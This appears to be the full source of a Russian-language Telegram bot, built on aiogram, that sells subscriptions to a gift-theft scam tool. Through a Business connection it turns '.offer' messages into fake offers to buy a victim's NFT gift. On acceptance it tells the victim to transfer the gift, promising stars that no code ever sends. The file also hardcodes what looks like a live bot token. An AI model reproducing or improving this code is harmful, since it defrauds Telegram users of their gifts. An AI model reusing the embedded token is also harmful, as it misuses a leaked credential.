# lang: Python 3.11+
# file: bot.py
# runtime: aiogram 3.x

import asyncio
import logging
import re
import time

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    BusinessConnection, LinkPreviewOptions,
    LabeledPrice, PreCheckoutQuery,
    InputMediaPhoto, FSInputFile,
)
from aiogram.methods import EditMessageText
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command

BOT_TOKEN    = "9083916633:AAFTgk7Dad-3iJeHvZCUXM-1cof7Yxzb4tw"
BOT_USERNAME = "tondon_bot"
OWNERS       = {"pahanhati", "claud3helper"}

PHOTO_MENU   = "menu.jpg"
PHOTO_ACCESS = "access.jpg"
PHOTO_GRANT  = "grant.jpg"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

logging.basicConfig(level=logging.INFO)

access_db: dict[int, float] = {}
trial_used: set[int] = set()

OFFER_RE = re.compile(r"^\.offer\s+(https://t\.me/nft/([A-Za-z0-9_-]+)-(\d+))\s+(\d+)$")

PLANS = {
    "day1":  ("1 день",   20,  1),
    "day7":  ("7 дней",   75,  7),
    "day12": ("12 дней", 100, 12),
}


def has_access(user_id: int) -> bool:
    exp = access_db.get(user_id)
    return exp is not None and exp > time.time()


def grant_access(user_id: int, days: int) -> None:
    now = time.time()
    base = max(access_db.get(user_id, now), now)
    access_db[user_id] = base + days * 86400


def is_owner(message: Message) -> bool:
    u = message.from_user
    if not u:
        return False
    return (u.username or "").lower() in OWNERS


def kb_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 Пробный день бесплатно 🎁", callback_data="trial")],
        [InlineKeyboardButton(text="💚 Купить доступ",             callback_data="buy_menu")],
        [InlineKeyboardButton(text="⭐️ Оставить отзыв",           url="https://t.me/tondon_bot")],
    ])


def kb_buy() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="1 Пробный день бесплатно 🎁", callback_data="trial")],
        [InlineKeyboardButton(text="1 день — 20 ⭐️",              callback_data="buy_day1")],
        [InlineKeyboardButton(text="7 дней — 75 ⭐️",             callback_data="buy_day7")],
        [InlineKeyboardButton(text="12 дней — 100 ⭐️",           callback_data="buy_day12")],
        [InlineKeyboardButton(text="◀️ Назад",                    callback_data="back_menu")],
    ])


def kb_offer(stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{stars}"),
        InlineKeyboardButton(text="✅ Принять",   callback_data=f"accept:{stars}"),
    ]])


def kb_accept(stars: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❔ Как это сделать?",  callback_data=f"howto:{stars}"),
        InlineKeyboardButton(text="🔄 Передать подарок", url=f"https://t.me/{BOT_USERNAME}?start=transfer"),
    ]])


@dp.message(Command("start"))
async def cmd_start(message: Message) -> None:
    await message.answer_photo(
        photo=FSInputFile(PHOTO_MENU),
        caption="<b>Меню:</b>\n\n1️⃣ Пробный день бесплатно",
        reply_markup=kb_menu(),
    )


@dp.callback_query(F.data == "trial")
async def cb_trial(callback: CallbackQuery) -> None:
    uid = callback.from_user.id
    if uid in trial_used:
        await callback.answer("Пробный день уже был использован.", show_alert=True)
        return
    trial_used.add(uid)
    grant_access(uid, 1)
    await callback.answer("✅ Пробный день активирован!", show_alert=True)
    await callback.message.answer(
        "🎁 <b>Пробный день активирован!</b>\nДоступ открыт на 24 часа."
    )


@dp.callback_query(F.data == "buy_menu")
async def cb_buy_menu(callback: CallbackQuery) -> None:
    await callback.message.edit_media(
        media=InputMediaPhoto(
            media=FSInputFile(PHOTO_ACCESS),
            caption=(
                "<b>Купить доступ:</b>\n\n"
                "1️⃣ Пробный день бесплатно\n"
                "📅 1 день — 20 ⭐️\n"
                "📅 7 дней — 75 ⭐️\n"
                "📅 12 дней — 100 ⭐️"
            ),
        ),
        reply_markup=kb_buy(),
    )
    await callback.answer()


@dp.callback_query(F.data == "back_menu")
async def cb_back_menu(callback: CallbackQuery) -> None:
    await callback.message.edit_media(
        media=InputMediaPhoto(
            media=FSInputFile(PHOTO_MENU),
            caption="<b>Меню:</b>\n\n1️⃣ Пробный день бесплатно",
        ),
        reply_markup=kb_menu(),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("buy_"))
async def cb_buy_plan(callback: CallbackQuery) -> None:
    key = callback.data[4:]
    plan = PLANS.get(key)
    if not plan:
        await callback.answer()
        return
    label, stars, days = plan
    await bot.send_invoice(
        chat_id=callback.message.chat.id,
        title=f"Доступ: {label}",
        description=f"Доступ к боту на {days} {'день' if days == 1 else 'дней'}",
        payload=f"access:{key}:{callback.from_user.id}",
        currency="XTR",
        prices=[LabeledPrice(label=label, amount=stars)],
    )
    await callback.answer()


@dp.pre_checkout_query()
async def pre_checkout(query: PreCheckoutQuery) -> None:
    await query.answer(ok=True)


@dp.message(F.successful_payment)
async def on_payment(message: Message) -> None:
    payload = message.successful_payment.invoice_payload
    parts = payload.split(":")
    if len(parts) != 3 or parts[0] != "access":
        return
    key, uid = parts[1], int(parts[2])
    plan = PLANS.get(key)
    if not plan:
        return
    label, stars, days = plan
    grant_access(uid, days)
    exp_str = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
    await message.answer(
        f"✅ <b>Оплата прошла!</b>\n"
        f"Доступ активирован на <b>{days} {'день' if days == 1 else 'дней'}</b>.\n"
        f"Истекает: {exp_str} ⭐️"
    )


@dp.message(Command("grantid"))
async def cmd_grantid(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 3:
        await message.answer("Формат: /grantid user_id дни")
        return
    try:
        uid  = int(parts[1])
        days = int(parts[2])
    except ValueError:
        await message.answer("Оба аргумента должны быть числами")
        return
    grant_access(uid, days)
    exp_str = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
    await message.answer(
        f"✅ Доступ выдан <code>{uid}</code> на <b>{days} дней</b>.\nИстекает: {exp_str}"
    )
    try:
        await bot.send_photo(
            chat_id=uid,
            photo=FSInputFile(PHOTO_GRANT),
            caption=(
                f"🎉 <b>Вам выдан доступ на {days} {'день' if days == 1 else 'дней'}!</b>\n"
                f"Истекает: {exp_str}"
            ),
        )
    except Exception as e:
        logging.warning(f"notify user failed: {e}")


@dp.message(Command("revoke"))
async def cmd_revoke(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        await message.answer("Формат: /revoke user_id")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("user_id должен быть числом")
        return
    access_db.pop(uid, None)
    await message.answer(f"✅ Доступ <code>{uid}</code> отозван.")


@dp.message(Command("checkid"))
async def cmd_checkid(message: Message) -> None:
    if not is_owner(message):
        return
    parts = message.text.split()
    if len(parts) != 2:
        await message.answer("Формат: /checkid user_id")
        return
    try:
        uid = int(parts[1])
    except ValueError:
        await message.answer("user_id должен быть числом")
        return
    if has_access(uid):
        exp_str = time.strftime("%d.%m.%Y %H:%M", time.localtime(access_db[uid]))
        await message.answer(f"✅ Доступ активен до {exp_str}")
    else:
        await message.answer("❌ Доступа нет")


async def process_offer(message: Message) -> None:
    if not message.text:
        return
    match = OFFER_RE.match(message.text.strip())
    if not match:
        return
    nft_url   = match.group(1)
    gift_name = match.group(2).replace("-", " ")
    stars     = int(match.group(4))
    biz_id    = message.business_connection_id
    chat_id   = message.chat.id
    new_text  = (
        f'<a href="{nft_url}">🎁 {gift_name}</a>\n'
        f"Предлагает продать этот подарок за <b>{stars} ⭐️</b>"
    )
    try:
        edit_kwargs: dict = dict(
            chat_id=chat_id,
            message_id=message.message_id,
            text=new_text,
            reply_markup=kb_offer(stars),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
        if biz_id:
            edit_kwargs["business_connection_id"] = biz_id
        await bot(EditMessageText(**edit_kwargs))
    except Exception as e:
        logging.warning(f"edit failed: {e}")


@dp.business_message()
async def on_business_message(message: Message) -> None:
    logging.info(f"business_message: {message.text!r}")
    await process_offer(message)


@dp.message(F.text.startswith(".offer"))
async def on_message_offer(message: Message) -> None:
    await process_offer(message)


@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(callback: CallbackQuery) -> None:
    await callback.message.edit_text("❌ Предложение отклонено.")
    await callback.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(callback: CallbackQuery) -> None:
    stars = int(callback.data.split(":")[1])
    await callback.message.edit_text(
        text=(
            f"✅ <b>Предложение принято!</b>\n\n"
            f"📖 <b>Как передать подарок:</b>\n\n"
            f"1. Открой профиль или нажми «Передать подарок»\n"
            f"2. Выбери нужный подарок из своей коллекции\n"
            f"3. Нажми <b>Передать</b> и выбери получателя\n"
            f"4. После передачи <b>{stars} ⭐️</b> придут автоматически\n\n"
            f"⚠️ Передача необратима."
        ),
        reply_markup=kb_accept(stars),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("howto:"))
async def cb_howto(callback: CallbackQuery) -> None:
    stars = int(callback.data.split(":")[1])
    await callback.message.edit_text(
        text=(
            f"📖 <b>Как передать подарок:</b>\n\n"
            f"1. Открой профиль или нажми «Передать подарок»\n"
            f"2. Выбери нужный подарок из своей коллекции\n"
            f"3. Нажми <b>Передать</b> и выбери получателя\n"
            f"4. После передачи <b>{stars} ⭐️</b> придут автоматически\n\n"
            f"⚠️ Передача необратима."
        ),
        reply_markup=kb_accept(stars),
    )
    await callback.answer()


@dp.business_connection()
async def on_business_connection(bc: BusinessConnection) -> None:
    logging.info(f"business_connection: user={bc.user.id} enabled={bc.is_enabled}")


async def main() -> None:
    await dp.start_polling(bot, allowed_updates=[
        "message",
        "callback_query",
        "pre_checkout_query",
        "business_connection",
        "business_message",
        "edited_business_message",
        "deleted_business_messages",
    ])


if __name__ == "__main__":
    asyncio.run(main())
